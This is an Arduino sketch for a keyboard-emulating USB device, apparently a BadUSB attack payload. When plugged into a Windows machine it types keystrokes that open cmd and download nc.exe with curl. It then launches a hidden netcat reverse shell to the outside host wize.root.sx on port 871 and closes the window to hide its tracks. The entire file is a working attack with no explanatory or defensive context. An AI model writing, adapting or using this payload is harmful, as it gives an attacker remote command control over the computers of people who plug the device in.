
#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  Keyboard.begin();

  delay(1500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("curl https://raw.githubusercontent.com/77697a65/The-Wize-Toolbox/master/nc.exe > nc.exe");

  typeKey(KEY_RETURN);
  
  delay (500);
  
  Keyboard.print("pythonw -c @from subprocess import check_output; check_output('nc.exe wize.root.sx 871 -e cmd.exe', shell=True)@ ");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("exit");

  delay(50);

  typeKey(KEY_RETURN);

  Keyboard.end();
}
void loop() {}
